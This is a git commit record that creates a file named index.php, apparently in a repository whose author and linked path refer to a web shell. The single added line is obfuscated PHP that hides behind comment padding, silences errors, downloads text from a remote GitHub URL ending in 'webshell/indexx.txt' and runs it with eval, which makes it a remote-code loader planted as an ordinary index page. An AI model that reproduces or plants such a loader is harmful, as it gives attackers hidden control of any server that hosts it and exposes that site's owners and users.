7cb6d63c51f0d82bc5a89b9d224f0d1c1fe41d4e
null7ganteng <null7ganteng@gmail.com>
2025-07-20 21:35:25 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,1 @@
+<?=/****/@/*77777*/null; /******/@/*77777*/error_reporting(0);/****/@/*77777*/null; /******/@/*77777*/eval/******/("?>".file_get_contents("https://github.com/null7ganteng/webshell/raw/refs/heads/main/indexx.txt"))/******/ /**/?>
